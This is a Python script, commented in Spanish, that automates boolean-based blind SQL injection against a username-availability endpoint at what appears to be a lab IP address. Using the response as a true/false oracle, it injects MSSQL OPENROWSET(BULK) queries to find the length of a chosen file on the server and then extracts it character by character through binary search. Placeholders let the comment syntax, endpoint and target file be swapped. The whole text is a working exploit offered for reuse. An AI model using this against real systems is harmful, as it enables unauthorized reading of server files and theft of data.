import requests
import json
import sys
from urllib.parse import quote_plus

### Dato valido
dato = "maria"

#  Llamado a la accion del script
def oracle(q):
    p = quote_plus(f"{dato}' AND ({q})--") ### CAMBIAR EL COMENTARIO POR EL CORRESPONDIENTE AL DBMS
    r = requests.get(
        f"http://10.129.204.197/api/check-username.php?u={p}" ### ENDPOINT GET DE LA INYECCION
    )
    j = json.loads(r.text)
    return j['status'] == 'taken' ### RESPUESTA TRUE

file_path = '' # Target file

# OBTENER CANTIDAD DE CARACTERES DEL DOCUMENTO
length = 1
while not oracle(f"(SELECT LEN(BulkColumn) FROM OPENROWSET(BULK '{file_path}', SINGLE_CLOB) AS x)={length}"):
    length += 1
print(f"[*] File length = {length}")

# Dump EL ARCHIVO
print("[*] File = ", end='')
for i in range(1, length + 1):
    low = 0
    high = 127
    while low <= high:
        mid = (low + high) // 2
        if oracle(f"(SELECT ASCII(SUBSTRING(BulkColumn,{i},1)) FROM OPENROWSET(BULK '{file_path}', SINGLE_CLOB) AS x) BETWEEN {low} AND {mid}"):
            high = mid -1
        else:
            low = mid + 1
    print(chr(low), end='')
    sys.stdout.flush()
print()
